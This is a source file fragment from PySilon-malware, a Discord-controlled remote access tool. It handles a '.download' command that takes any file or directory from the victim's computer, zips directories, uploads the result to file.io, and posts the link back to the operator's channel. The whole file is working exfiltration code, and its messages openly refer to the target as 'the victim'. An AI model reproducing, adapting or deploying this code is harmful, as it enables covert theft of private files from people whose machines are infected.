from shutil import copy2, rmtree
from zipfile import ZipFile
import os
import requests
# end of imports
# on message
elif message.content[:9] == '.download':
    #.log Message is "download" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is the file-related channel 
        if message.content == '.download':
            #.log Author issued empty ".download" command 
            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            #.log Sent embed about usage of ".download" 
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                #.log File requested by Author does exist on this PC 
                target_file = '/'.join(working_directory) + '/' + message.content[10:]
                #.log Determined actual path to requested file 
                if os.path.isdir(target_file):
                    #.log The file turned out to be a directory 
                    target_file += '.zip'
                    with ZipFile(target_file,'w') as zip:
                        for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                            try:
                                zip.write(file)
                                #.log Compressed the directory into .zip 
                            except Exception as e:
                                #.log Error occurred while compressing the directory into .zip 
                                message.channel.send(e)
                                #.log Sent message with information about this error. Aborting operation 
                                pass
                await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..```")
                #.log Sent message about File.io upload 
                data = {
                    'file': open(target_file, 'rb')
                }
                url = 'https://file.io/'
                #.log Set up required things for File.io upload 
                response = requests.post(url, files=data)
                #.log Uploaded the file onto File.io
                data = response.json()
                #.log Received response from File.io 
                embed = discord.Embed(title=f"🟢 {message.content[10:]}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await message.channel.send(embed=embed)
                #.log Sent Anonfiles link to uploaded file
                await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
            else:
                #.log File requested by Author does not exist on this PC 
                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                #.log Sent embed about missing file 
    else:
        #.log Message is not sent on file-related channel 
        embed = discord.Embed(title="📛 Error",description=f'_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent embed about wrong channel 
